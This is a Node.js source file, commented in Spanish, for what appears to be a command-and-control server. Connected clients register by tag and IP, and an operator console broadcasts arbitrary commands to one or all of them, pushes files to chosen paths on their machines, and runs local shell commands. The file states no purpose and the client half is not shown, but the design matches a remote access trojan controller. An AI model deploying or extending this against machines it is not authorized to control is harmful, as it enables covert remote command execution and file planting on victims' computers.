const express = require('express');
const socket = require('socket.io');
const shell = require('shelljs');
const readline = require('readline');
const dl = require('delivery');
// const chalk = require('chalk'); Color para la consola, para linux.

var app = express();
var server = app.listen(3001);
var io = socket(server);

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

var clients = [];

io.sockets.on('connection', newConnection);

function newConnection(socket){
    //console.log("New connection " + socket.id);

    socket.on('identifier', function(identifier){
        if(!find(identifier.tag)){
            socket.tag = identifier.tag;
            socket.ip = socket.request.connection.remoteAddress; // Obtenemos el ip.
            // En windows retorna ::ffff:IP, quitaremos el ::ffff: luego si deseamos.
            socket.port = socket.request.connection.remotePort; // Obtenemos el puerto.
            clients.push(socket);
        }
    });

    socket.on('disconnect', function() {
        clients.splice(clients.indexOf(socket), 1);
        //console.log("Client has disconnected");
    });

    socket.emit('handshake');
}

function terminal(){
    rl.question('Command: ', function (answer) {
        if (answer == 'exit') return rl.close(); //closing RL and returning from function.
        executeCommand(answer);
        terminal();
    });
}

function executeCommand(command){
    var words = command.split(" ");
    var clientIndex = words[1];

    var quotes = command.split('"');
    //console.log(quotes[1], quotes[3], quotes[5]);


    if(words[0] == "list"){
        showClients();
    }
    else if(words[0] == "cls"){
        cls();
    }
    else if(words[0] == "send"){ // Example: send number "command"
        sendCommand(clientIndex, quotes[1]);
    }
    else if(words[0] == "shell"){
        shell.exec(quotes[1]);
    }
    else if (words[0] == "sendfile"){ // Example: sendfile number "C:/etc/example.jpg" "root/users/"
        var localPath = quotes[1];
        var temp = localPath.split('/');
        var fileName = temp[temp.length-1];
        var targetPath = quotes[3];

        console.log(clientIndex, localPath, fileName, targetPath);
        sendFile(clientIndex, localPath, fileName, targetPath); 
    }
    else if (words[0] == "getfile"){
        getFile();
    }
    else{
        console.log("Command not found");
    }
}

function sendCommand(clientIndex, command){
    console.log("Enviando");
    if(clientIndex == "all"){
        io.sockets.emit('command', command);
    }
    else{
        clients[clientIndex].emit('command', command);
    }
}

function showClients(){
    if(clients.length == 0) {
        console.log("No devices connected");
        return;
    }

    for(var i = 0; i < clients.length; i++){
        console.log(i + ". " + clients[i].tag + " - " + clients[i].ip + " - " + clients[i].port);
    }
}

function find(clientTag){
    for(var i = 0; i < clients.length; i++){
        if(clients[i].tag == clientTag){
            return clients[i].id;
        }
    }
    return false;
}

function cls(){
    console.log('\033c');
}

function sendFile(clientIndex, localPath, fileName, targetPath){

    if(clientIndex == "all"){
        var delivery = dl.listen(io.sockets);
        io.sockets.emit('clientWritePath', targetPath);
    }
    else{
        var delivery = dl.listen(clients[clientIndex]);
        clients[clientIndex].emit('clientWritePath', targetPath)
    }
    
    delivery.connect();

    delivery.on('delivery.connect',function(delivery){
        delivery.send({
            name: fileName,
            path : localPath
        });

        delivery.on('send.success',function(file){
            console.log('File successfully sent to client!');
        });
    });
}

function getFile(){

}

cls();
terminal();